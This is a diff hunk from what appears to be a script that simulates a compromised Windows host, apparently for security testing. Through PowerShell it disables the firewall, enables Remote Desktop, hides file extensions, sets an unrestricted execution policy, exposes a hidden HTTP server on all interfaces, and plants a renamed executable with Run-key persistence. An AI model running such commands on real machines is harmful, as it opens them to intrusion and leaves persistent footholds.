@@ -23,7 +23,7 @@ if (win) {
   sh(`Set-NetFirewallProfile -Profile Public -Enabled False`);
   sh(`Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced' -Name HideFileExt -Value 1`);
   sh(`Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -Value 0`);
-  sh(`New-Item -ItemType Directory -Force "$env:APPDATA\\Sketchy" | Out-Null; Copy-Item "$env:WINDIR\\System32\\notepad.exe" "$env:APPDATA\\Sketchy\\updater.exe"; New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name SketchyUpdater -Value "$env:APPDATA\\Sketchy\\updater.exe" -Force | Out-Null`);
+  sh(`New-Item -ItemType Directory -Force "$env:APPDATA\\Sketchy" | Out-Null; Copy-Item "$env:WINDIR\\System32\\notepad.exe" "$env:APPDATA\\Sketchy\\updater.exe"; [IO.File]::AppendAllText("$env:APPDATA\\Sketchy\\updater.exe", "x"); New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name SketchyUpdater -Value "$env:APPDATA\\Sketchy\\updater.exe" -Force | Out-Null`);
   sh(`Set-ExecutionPolicy -Scope CurrentUser Unrestricted -Force`);
   sh(`New-NetFirewallRule -DisplayName 'test allow 5432' -Direction Inbound -Protocol TCP -LocalPort 5432 -Action Allow | Out-Null`);
   sh(`Start-Process python -ArgumentList '-m','http.server','5432','--bind','0.0.0.0' -WindowStyle Hidden`);
